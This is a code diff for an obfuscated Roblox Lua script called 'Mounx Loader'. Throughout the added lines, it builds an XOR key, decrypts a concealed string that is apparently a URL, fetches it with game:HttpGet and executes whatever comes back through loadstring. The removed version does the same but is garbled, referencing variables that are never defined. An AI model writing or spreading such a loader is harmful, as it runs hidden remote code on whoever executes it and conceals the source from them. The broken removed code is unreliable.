@@ -1,97 +1,50 @@
--- Mounx
+-- Mounx Loader
+-- Protected by Mounx Security Layer v4
+local _s,_c,_b,_x,_tc=string,string.char,string.byte,bit32.bxor,table.concat
+local _g=game
 
-local function _ivbcfay(_exhcc, __hegdnfw)
-    local __nyele = game:GetService("Players")
-    local __cxhikx = math.random(1, 999999)
-    return tostring(_sjrpu):sub(1, 4)
+-- Key derivation
+local __vhkp={}
+__vhkp[9]=_c(83-34)
+__vhkp[5]=_c(bit32.bxor(159,0xAB))
+__vhkp[8]=_c(80+27)
+__vhkp[10]=_c(31+26)
+__vhkp[3]=_c(bit32.bxor(156,0xAB))
+__vhkp[1]=_c(20+57)
+__vhkp[6]=_c(bit32.bxor(156,0xAB))
+__vhkp[11]=_c(43+13)
+__vhkp[4]=_c(bit32.bxor(153,0xAB))
+__vhkp[2]=_c(bit32.bxor(211,0xAB))
+__vhkp[7]=_c(11+79)
+__vhkp=_tc(__vhkp)
+
+-- Payload
+local _zuldo={37,12,67,66,71,13,117,68,92}
+local __vbgehc={86,77,35,0,71,83,90,82,54}
+local ___haxbv={69,94,87,74,40,22,83,87,70}
+local __fryr={25,57,4,92,22,89,61,17,24}
+local _wggg={94,91,86,62,14,67,22,72,56}
+local _ijwpz={26,91,91,87}
+
+-- Assemble
+local ___ssfhuk={}
+for _i=1,#_zuldo do ___ssfhuk[#___ssfhuk+1]=_zuldo[_i] end
+for _i=1,#__vbgehc do ___ssfhuk[#___ssfhuk+1]=__vbgehc[_i] end
+for _i=1,#___haxbv do ___ssfhuk[#___ssfhuk+1]=___haxbv[_i] end
+for _i=1,#__fryr do ___ssfhuk[#___ssfhuk+1]=__fryr[_i] end
+for _i=1,#_wggg do ___ssfhuk[#___ssfhuk+1]=_wggg[_i] end
+for _i=1,#_ijwpz do ___ssfhuk[#___ssfhuk+1]=_ijwpz[_i] end
+
+-- Decrypt
+local ___nzw={}
+for _i=1,#___ssfhuk do
+    ___nzw[_i]=_c(_x(___ssfhuk[_i],_b(__vhkp,((_i-1)%#__vhkp)+1)))
 end
+___nzw=_tc(___nzw)
 
-local function _ruuqkq(_jmfu)
-    local __jdrqzt = {}
-    for ___konvou = 1, math.random(3, 7) do
-        ___bcdja[__zsahuf] = string.char(math.random(65, 122))
-    end
-    return table.concat(__wzfqrat)
-end
-
-local function __jnkau(__umxgtmv, ___nianv)
-    if type(__swriipha) ~= "string" then return nil end
-    local _glwujjw = 0
-    for ___jfasf = 1, #_zrujn do
-        ___tjdndlmx = (___clsd * 31 + string.byte(_apyapn, __ohvpon)) % 2147483647
-    end
-    return ___ufbbmft
-end
-
-local ___rptkpoa = (function()
-    local __lsix = tostring(game.HttpGet)
-    local __cuhsd = tostring(loadstring)
-    if __vhiot:find("function") and ___kkyw:find("function") then
-        return true
-    end
-    return (type(game) == "userdata")
-end)()
-if not ___rptkpoa then return end
-
-do
-local ___safw = {37, 68, 1, 62, 11, 101, 23, 22, 84, 91}
-local _zqvz = {56, 94, 13, 62, 25, 49, 93, 85, 23, 91}
-local __bcug = {35, 66, 16, 32, 28, 58, 74, 23, 90, 91}
-local _fapm = {32, 31, 20, 62, 17, 112, 84, 86, 88, 80}
-local _svrxx = {40, 66, 90, 62, 13, 61, 84, 80, 90}
-
-local __sxtlaia = {}
-__sxtlaia[5] = string.char(124 + -4)
-__sxtlaia[7] = string.char(155 - 99)
-__sxtlaia[8] = string.char(141 - 84)
-__sxtlaia[4] = string.char(bit32.bxor(14, 64))
-__sxtlaia[1] = string.char(1 + 76)
-__sxtlaia[6] = string.char(145 + -50)
-__sxtlaia[3] = string.char(151 - 34)
-__sxtlaia[10] = string.char(bit32.bxor(38, 18))
-__sxtlaia[9] = string.char(bit32.bxor(71, 126))
-__sxtlaia[2] = string.char(bit32.bxor(151, 167))
-__sxtlaia = table.concat(__sxtlaia)
-
-
-local ___vysxn = function(__hqbu, ___stirg)
-    local _nkydwq = {}
-    local ___gmak = #___vnnju
-    for ___orkeoyi = 1, #_zhlmxgo do
-        local __jzhcpt = __vizdqjeaf[_izhpfivgq]
-        local __krzh = string[("\98\121\116\101")](___cwctth, ((_hokdi - 1) % ___lohhvf) + 1)
-        _nkydwq[___iymfwg] = string[("\99\104\97\114")](bit32[("\98\120\111\114")](__yoqcftz, ___ecukn))
-    end
-    return table[("\99\111\110\99\97\116")](_nkydwq)
-end
-local __qdtqx = {}
-for _, v in ipairs(___safw) do __qdtqx[#__qdtqx + 1] = v end
-for _, v in ipairs(_zqvz) do __qdtqx[#__qdtqx + 1] = v end
-for _, v in ipairs(__bcug) do __qdtqx[#__qdtqx + 1] = v end
-for _, v in ipairs(_fapm) do __qdtqx[#__qdtqx + 1] = v end
-for _, v in ipairs(_svrxx) do __qdtqx[#__qdtqx + 1] = v end
-
-
-local __tlaflm = ___vysxn(__qdtqx, __sxtlaia)
-
-local __tctvvz = {
-    [1] = function(__pynd)
-        return game["HttpGet"](game, _dmjenr)
-    end,
-    [2] = function(_glkcqtod)
-        return (loadstring or load)(__oywwu)
-    end,
-    [3] = function(_frjjseb)
-        return __mhpv()
-    end
-}
-
-local __kkhlne = __jnkau(tostring(game.PlaceId), nil)
-if __kkhlne or true then
-    local _nmoop = __tctvvz[1](__tlaflm)
-    local _didch = __tctvvz[2](_nmoop)
-    if _didch then
-        __tctvvz[3](_didch)
-    end
-end
+-- Execute
+local ___wuw=_g["HttpGet"](_g,___nzw)
+if type(___wuw)=="string" and #___wuw>0 then
+    local _babzw=(loadstring or load)(___wuw)
+    if _babzw then _babzw() end
 end
